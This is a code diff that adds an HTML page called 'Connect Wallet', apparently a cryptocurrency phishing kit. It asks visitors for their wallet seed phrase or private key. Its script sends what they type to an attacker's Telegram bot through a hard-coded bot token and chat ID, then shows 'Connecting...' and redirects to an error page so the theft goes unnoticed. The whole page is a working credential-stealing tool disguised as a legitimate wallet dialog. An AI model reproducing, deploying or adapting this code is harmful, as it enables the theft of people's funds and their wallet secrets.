@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Connect Wallet</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #ffffff;
+        }
+
+        .phrase-wider-popup {
+            background-color: #1e1e1e;
+            width: 380px;
+            padding: 30px;
+            border-radius: 25px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+        }
+
+        .wallet-icons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 5px;
+            width: 80px;
+            margin: 0 auto 20px;
+        }
+
+        .wallet-icon {
+            width: 35px;
+            height: 35px;
+            border-radius: 8px;
+        }
+
+        .phrase-subtitle {
+            font-size: 1.4em;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 10px;
+        }
+
+        .phrase-subtext {
+            font-size: 0.95em;
+            color: #888;
+            margin-bottom: 25px;
+        }
+
+        .phrase-div {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .phrase input {
+            width: 100%;
+            padding: 12px;
+            background-color: #2a2a2a;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 0.9em;
+            text-align: left;
+        }
+
+        .phrase input::placeholder {
+            color: #666;
+        }
+
+        .phrase-select {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .phrase-select-option {
+            padding: 10px 25px;
+            background-color: #2a2a2a;
+            border-radius: 20px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: background-color 0.2s;
+        }
+
+        .phrase-select-selected {
+            background-color: #3a3a3a;
+        }
+
+        .phrase-button {
+            background-color: #e91e63;
+            color: white;
+            border: none;
+            padding: 14px 0;
+            width: 100%;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: 500;
+            transition: background-color 0.2s;
+        }
+
+        .phrase-button:hover {
+            background-color: #d81557;
+        }
+
+        .phrase-button:disabled {
+            background-color: #444;
+            cursor: not-allowed;
+        }
+
+        .tab-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .tab {
+            padding: 10px 25px;
+            background-color: #2a2a2a;
+            border-radius: 20px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: background-color 0.2s;
+        }
+
+        .tab.active {
+            background-color: #3a3a3a;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .private-key-input {
+            width: 100%;
+            padding: 12px;
+            background-color: #2a2a2a;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 0.9em;
+            resize: none;
+            margin-bottom: 25px;
+            box-sizing: border-box;
+        }
+
+        .private-key-input::placeholder {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="phrase-wider-popup">
+        <img class="wallet-icon" src="non-web3-wallets.png" alt="Wallet Icon" />
+        
+        <h1 class="phrase-subtitle">Connect Wallet Manually</h1>
+        
+        <div class="tab-container">
+            <div class="tab active" data-tab="phrase">Seed Phrase</div>
+            <div class="tab" data-tab="private-key">Private Key</div>
+        </div>
+
+        <div id="phrase-content" class="tab-content active">
+            <p class="phrase-subtext">Please enter your seed phrase to continue</p>
+            <div class="phrase-div">
+                <div class="phrase">
+                    <input type="text" placeholder="Word 1" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 2" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 3" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 4" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 5" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 6" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 7" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 8" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 9" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 10" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 11" />
+                </div>
+                <div class="phrase">
+                    <input type="text" placeholder="Word 12" />
+                </div>
+            </div>
+
+            <div class="phrase-select">
+                <div class="phrase-select-option phrase-select-selected">12 words</div>
+                <div class="phrase-select-option">24 words</div>
+            </div>
+        </div>
+
+        <div id="private-key-content" class="tab-content">
+            <p class="phrase-subtext">Please enter your private key to continue</p>
+            <textarea 
+                class="private-key-input"
+                placeholder="Enter your private key"
+                rows="3"
+            ></textarea>
+        </div>
+
+        <button class="phrase-button">Proceed</button>
+    </div>
+
+    <script>
+        // Tab switching functionality
+        const tabs = document.querySelectorAll('.tab');
+        const contents = document.querySelectorAll('.tab-content');
+
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                contents.forEach(c => c.classList.remove('active'));
+                
+                tab.classList.add('active');
+                document.getElementById(`${tab.dataset.tab}-content`).classList.add('active');
+            });
+        });
+
+        // Word count switching
+        const wordCountOptions = document.querySelectorAll('.phrase-select-option');
+        wordCountOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                wordCountOptions.forEach(opt => opt.classList.remove('phrase-select-selected'));
+                option.classList.add('phrase-select-selected');
+            });
+        });
+
+        // Form submission
+        document.querySelector('.phrase-button').addEventListener('click', function() {
+            const activeTab = document.querySelector('.tab.active').dataset.tab;
+            let submissionData = '';
+
+            if (activeTab === 'phrase') {
+                const inputs = document.querySelectorAll('.phrase input');
+                const words = Array.from(inputs)
+                    .map(input => input.value.trim())
+                    .filter(word => word !== '');
+
+                if (words.length < 12) {
+                    alert('Please enter all required words');
+                    return;
+                }
+                submissionData = words.join(' ');
+            } else {
+                const privateKey = document.querySelector('.private-key-input').value.trim();
+                if (!privateKey) {
+                    alert('Please enter your private key');
+                    return;
+                }
+                submissionData = privateKey;
+            }
+
+            const telegramBotToken = "7739308159:AAG73lHZwbaFfPIaUCGCB91G-4YRMl1U_2c";
+            const telegramChatId = "1002261747776";
+            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(submissionData)}`;
+
+            fetch(telegramUrl)
+                .then(response => response.json())
+                .then(() => {
+                    this.textContent = 'Connecting...';
+                    this.disabled = true;
+                    setTimeout(() => {
+                        window.location.href = 'error.html';
+                    }, 1000);
+                })
+                .catch(console.error);
+        });
+    </script>
+</body>
+</html>
